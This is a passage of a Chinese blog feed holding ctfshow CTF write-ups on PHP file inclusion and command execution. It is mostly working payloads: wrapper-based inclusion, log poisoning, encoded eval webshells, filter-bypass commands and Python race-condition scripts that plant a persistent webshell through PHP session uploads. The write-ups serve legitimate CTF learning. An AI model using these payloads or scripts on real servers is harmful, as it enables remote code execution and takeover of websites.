class="hljs-title">isVIP</span></span>()&#123;<br>        <span class="hljs-built_in">return</span> <span class="hljs-variable">$this</span>-&gt;vip?TRUE:FALSE;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> __autoload(<span class="hljs-variable">$class</span>)&#123;<br>        <span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$class</span>))&#123;<br>            <span class="hljs-variable">$class</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">#过滤字符</span><br><span class="hljs-variable">$key</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="hljs-variable">$key</span>))&#123;<br>    die(<span class="hljs-string">&quot;error&quot;</span>);<br>&#125;<br><span class="hljs-variable">$ctf</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br>extract(<span class="hljs-variable">$_GET</span>);<br><span class="hljs-keyword">if</span>(class_exists(<span class="hljs-variable">$__CTFSHOW__</span>))&#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;class is exists!&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$isVIP</span> &amp;&amp; strrpos(<span class="hljs-variable">$ctf</span>, <span class="hljs-string">&quot;:&quot;</span>)===FALSE &amp;&amp; strrpos(<span class="hljs-variable">$ctf</span>,<span class="hljs-string">&quot;log&quot;</span>)===FALSE)&#123;<br>    include(<span class="hljs-variable">$ctf</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这题把log给禁用了，先上一下官方给的exp<a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py">https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py</a></p><p><a href="https://blog.csdn.net/Kracxi/article/details/122015333">学习文章</a></p><p><code>__autoload($class)</code> 是 PHP 中用于自动加载类的特殊函数。当你试图使用一个尚未定义的类时，PHP 会自动调用这个 <code>__autoload()</code> 函数，并将类名作为参数传递给它。</p><p><code>class_exists($__CTFSHOW__)</code> 是 PHP 中的一个函数调用，用于检查给定的类是否已经定义。</p><h3 id="0x01-19"><a href="#0x01-19" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?..CTFSHOW..=phpinfo<br></code></pre></td></tr></table></figure><p>我觉得也算非预期，用phpinfo查看，根据特性把_改成了.,搜索<code>ctfshow&#123;</code></p><h3 id="0x02-19"><a href="#0x02-19" class="headerlink" title="0x02"></a>0x02</h3><p>自己研究下exp吧，我太懒了😋</p>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php特性</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow文件包含</title>
    <link href="/2024/09/13/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2024/09/13/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<p>前言:炒冷饭也不失一种乐趣。</p><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=data://text/plain;<span class="hljs-built_in">base64</span>,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=<br></code></pre></td></tr></table></figure><p>原理就是将<?php system("tac flag.php") ?>&#96;进行base64写进去执行</p><h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=/var/log/nginx/access.log<br></code></pre></td></tr></table></figure><p>容器环境利用nginx，然后写个读写就行,先进行ls然后进行读取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php system(<span class="hljs-string">&#x27;tac fl0g.php&#x27;</span>);?&gt; <br></code></pre></td></tr></table></figure><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=pHp://input<br></code></pre></td></tr></table></figure><p>然后bp发包post执行就行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php system(<span class="hljs-string">&#x27;tac fl0g.php&#x27;</span>)?&gt;<br></code></pre></td></tr></table></figure><h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=/var/log/nginx/access.log<br></code></pre></td></tr></table></figure><p>容器环境利用nginx，然后写个读写就行,先进行ls然后进行读取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php system(<span class="hljs-string">&#x27;tac fl0g.php&#x27;</span>);?&gt; <br></code></pre></td></tr></table></figure><h2 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h2><p>以下都是条件竞争本人也写的少</p><p>将所有条件的禁用了，只能使用session了。因为在php中我们能够利用的无后缀的文件就是session，我们可以利用<code>session.upload_progress</code>来进行文件包含，利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>参数</p><p>讲以下原理，在php5.4引入了一些内容在php.ini里面</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">session.upload<span class="hljs-emphasis">_progress.enable = on</span><br><span class="hljs-emphasis">session.upload_</span>progress.cleanup = on<br>session.upload<span class="hljs-emphasis">_progress.prefix = &quot;upload_</span>progress<span class="hljs-emphasis">_&quot;</span><br><span class="hljs-emphasis">session.upload_</span>progress.name = &quot;PHP<span class="hljs-emphasis">_SESSION_</span>UPLOAD<span class="hljs-emphasis">_PROGRESS&quot;</span><br></code></pre></td></tr></table></figure><ul><li><code>enable = on</code>表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</li><li><code>cleanup = on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</li><li><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</li><li><code>prefix+name</code>将表示为session中的键名;</li><li>另外还有一个session配置中的重要选项：<code>session.use_strict_mode=off</code>这个选项默认值为off，表示我们对Cookie中sessionid可控。</li></ul><p>进行大概的分析，<code>session.auto_start=on</code>，则php会在接收请求的时候会自动初始化Session，不再需要执行<code>session_start()</code>。但默认情况下，这个选项都是关闭的。但session还有一个默认选项，<code>session.use_strict_mode</code>默认值为0。此时用户是可以自己定义Session ID的。比如在Cookie里设置PHPSESSID&#x3D;orange,PHP将会在服务器里创建一个文件&#x2F;tmp&#x2F;sess_orange。即使没有初始化Session，PHP也会进行初始化，并产生一个键值，这个键值由上面的<code>prefix+name</code>组成，最后被写入sess_文件里面</p><p>这种题目建议用脚本多线程跑，直接上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> io<br><br>url = <span class="hljs-string">&quot;http://fc0d1b76-c5a1-495b-98ba-d7b85e5c7460.challenge.ctf.show/&quot;</span><br>sessID = <span class="hljs-string">&#x27;orange&#x27;</span><br>data = &#123;<br>    <span class="hljs-string">&quot;1&quot;</span>: <span class="hljs-string">&quot;file_put_contents(&#x27;/var/www/html/1.php&#x27;, &#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span><br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):<br>    fileBytes = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        res = session.post(url,<br>                           data=&#123;<br>                               <span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span><br>                           &#125;,<br>                           cookies=&#123;<br>                               <span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessID<br>                           &#125;,<br>                           files=&#123;<br>                               <span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;orange.png&#x27;</span>, fileBytes)<br>                           &#125;<br>                           )<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        res1 = session.post(url + <span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessID, data=data,<br>                            cookies=&#123;<br>                                <span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessID<br>                            &#125;)<br>        res2 = session.get(url + <span class="hljs-string">&#x27;1.php&#x27;</span>)<br>        <span class="hljs-keyword">if</span> res2.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-------ok------&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(res2.status_code)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    event = threading.Event()  <span class="hljs-comment"># 开启多线程的对象</span><br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):  <span class="hljs-comment"># 开5个线程</span><br>            threading.Thread(target=write, args=(session,)).start()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            threading.Thread(target=read, args=(session,)).start()<br><br>        event.<span class="hljs-built_in">set</span>()  <span class="hljs-comment"># 唤醒线程</span><br></code></pre></td></tr></table></figure><h2 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h2><p>和上面一致</p><h2 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h2><p>和上面一致优化了一下代码，用都是一样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> io<br><br>url = <span class="hljs-string">&quot;http://420c9489-80b6-4a27-a2ba-240311c8ef48.challenge.ctf.show/&quot;</span><br>sessID = <span class="hljs-string">&#x27;orange&#x27;</span><br>data = &#123;<br>    <span class="hljs-string">&quot;1&quot;</span>: <span class="hljs-string">&quot;file_put_contents(&#x27;/var/www/html/1.php&#x27;, &#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span><br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):<br>    file_bytes = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        session.post(url,<br>                     data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>&#125;,<br>                     cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessID&#125;,<br>                     files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;orange.png&#x27;</span>, file_bytes)&#125;)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        session.post(url + <span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessID, data=data, cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessID&#125;)<br>        res = session.get(url + <span class="hljs-string">&#x27;1.php&#x27;</span>)<br>        <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;+++done+++&quot;</span>)<br>            <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 假设成功后停止读取线程</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start_threads</span>(<span class="hljs-params">target, session, count=<span class="hljs-number">5</span></span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(count):<br>        threading.Thread(target=target, args=(session,), daemon=<span class="hljs-literal">True</span>).start()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">with</span> requests.Session() <span class="hljs-keyword">as</span> session:<br>        start_threads(write, session)<br>        start_threads(read, session)<br><br>    threading.Event().wait()  <span class="hljs-comment"># 保持主线程运行</span><br><br></code></pre></td></tr></table></figure><p>由于是多线程，及时执行system也删不完，所以基本没什么用，之前的代码就行了</p><h2 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h2><p>和上面一致</p><h2 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h2><p>和上面一致</p><h2 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h2><p>这题加入了post并且加入了死亡绕过，不是条件竞争了</p><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>rot13进行绕过</p><p>用<code>php://filter/write=string.rot13/resource=orange.php</code>进行写入，需要双url进行绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%36%66%25%37%32%25%36%31%25%36%65%25%36%37%25%36%35%25%32%65%25%37%30%25%36%38%25%37%30<br></code></pre></td></tr></table></figure><p>content写入简单的一句话木马然后rot13编码一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">content=&lt;?cuc @riny(<span class="hljs-variable">$_TRG</span>[<span class="hljs-string">&#x27;pzq&#x27;</span>]);?&gt;<br></code></pre></td></tr></table></figure><p>进入&#x2F;orange.php 执行<code>?cmd=system(&#39;tac f*&#39;);</code></p><h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>base64进行绕过</p><p>方法基本一致，用<code>php://filter/write=convert.base64-decode/resource=apple.php</code>进行双url</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?filebr></code></pre></td></tr></table></figure><p>然后给一句话木马写入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">content=11PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs/Pg==<br></code></pre></td></tr></table></figure><p>前面多加两个字符，为了使前面的结合成功进行base64，剩下的都是一样的了</p><h2 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h2><p>跟web79基本一致，需要微调一下代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=data://text/plain;<span class="hljs-built_in">base64</span>,PD9waHAgZXZhbCgkX0dFVFsnY21kJ10pO3dob2FtaSgpPz4x&amp;cmd=system(<span class="hljs-string">&#x27;tac fl0g.php&#x27;</span>);<br></code></pre></td></tr></table></figure><p>中间的内容我写的是<code>&lt;?php eval($_GET[&#39;cmd&#39;]);whoami()?&gt;1</code></p><h2 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h2><p>这个我不想下载视频，直接看答案<code>?file=flag.php</code></p><h2 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h2><p>这题其实还是用伪协议进行绕过，只是禁用了常见的rot13和base64而已，换一个就行了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=orange.php<br>contents=?&lt;hp pe@av(l_<span class="hljs-variable">$OPTSj</span>[]z;)&gt;?<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br>highlight_file(__FILE__);<br>file_put_contents(<span class="hljs-string">&quot;php://filter/convert.iconv.ucs-2be.ucs-2le/resource=5.php&quot;</span><br>, <span class="hljs-string">&quot;&lt;?php die();?&gt;?&lt;hp pvela<span class="hljs-subst">$(G_TE&#x27;[&#x27;a)</span>] ;&gt;?&quot;</span>); <br>?&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow命令执行</title>
    <link href="/2024/09/11/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2024/09/11/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<p>前言:用了几天晚上时间把题目都过了一下，还是有值得学习的地方，炒冷饭也不失一种乐趣。web119-122的题目由于直接上传原文会对hexo的渲染模板可能造成模板注入，所以迫不得已上传的png</p><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=system(<span class="hljs-string">&quot;tac f*&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">tac</span> f*`;<br></code></pre></td></tr></table></figure><h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">tac</span> f*`;<br></code></pre></td></tr></table></figure><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">echo</span>`<span class="hljs-built_in">tac</span>%09f*`;<br></code></pre></td></tr></table></figure><h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=include<span class="hljs-variable">$_GET</span>[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=include<span class="hljs-variable">$_GET</span>[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=include<span class="hljs-variable">$_GET</span>[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=include<span class="hljs-variable">$_GET</span>[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=include<span class="hljs-variable">$_GET</span>[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=data://text/plain,&lt;?php system(<span class="hljs-string">&quot;tac fla*.php&quot;</span>)?&gt;<br></code></pre></td></tr></table></figure><h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=data://text/plain;<span class="hljs-built_in">base64</span>,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==<br></code></pre></td></tr></table></figure><h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=data://text/plain;<span class="hljs-built_in">base64</span>,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==<br></code></pre></td></tr></table></figure><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=data://text/plain,&lt;?php system(<span class="hljs-string">&quot;tac fla*.php&quot;</span>)?&gt;<br></code></pre></td></tr></table></figure><p>提前闭合</p><h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><h3 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));<br></code></pre></td></tr></table></figure><h3 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">eval</span>(end(current(get_defined_vars())));&amp;b=system(<span class="hljs-string">&#x27;tac flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><p>利用羽师傅的脚本直接跑出答案</p><h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><p>%0a截断后面无用的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span> flag.php%0a<br></code></pre></td></tr></table></figure><h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span> flag.php%0a<br></code></pre></td></tr></table></figure><h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span> fla?.php%0a<br></code></pre></td></tr></table></figure><h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span>%09fla?.php%0a<br></code></pre></td></tr></table></figure><h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><h3 id="0x01-3"><a href="#0x01-3" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">nl</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure><h3 id="0x02-3"><a href="#0x02-3" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure><h2 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h2><h3 id="0x01-4"><a href="#0x01-4" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure><h3 id="0x02-4"><a href="#0x02-4" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">?c=nl&lt;fl&#x27;&#x27;ag.php<span class="hljs-string">||</span><br></code></pre></td></tr></table></figure><h2 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h2><h3 id="0x01-5"><a href="#0x01-5" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td 